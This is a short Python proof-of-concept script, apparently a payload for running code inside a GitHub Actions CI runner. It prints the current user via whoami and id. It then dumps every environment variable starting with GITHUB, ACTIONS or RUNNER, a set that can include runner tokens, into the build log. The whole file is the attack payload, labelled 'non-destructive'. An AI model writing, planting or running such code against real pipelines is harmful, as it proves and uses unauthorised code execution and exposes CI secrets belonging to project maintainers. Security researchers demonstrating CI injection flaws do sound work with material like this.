import os
import subprocess

print("[*] sql.py PoC executed")
print("[*] whoami:", subprocess.check_output(["whoami"], text=True).strip())
print("[*] id:", subprocess.check_output(["id"], text=True).strip())

# Proof of environment visibility (non-destructive)
for k in sorted(os.environ):
    if k.startswith(("GITHUB", "ACTIONS", "RUNNER")):
        print(f"{k}={os.environ[k]}")